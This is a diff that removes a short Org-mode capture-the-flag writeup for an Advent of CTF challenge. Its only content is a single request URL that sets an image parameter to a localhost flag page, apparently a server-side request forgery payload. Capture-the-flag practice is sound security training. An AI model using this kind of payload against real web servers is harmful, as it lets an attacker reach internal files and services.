@@ -1,5 +1,0 @@
-#+TITLE: Writeup
-
-#+begin_src
-https://22.adventofctf.com/index.php?image=http://localhost/flag.php
-#+end_src
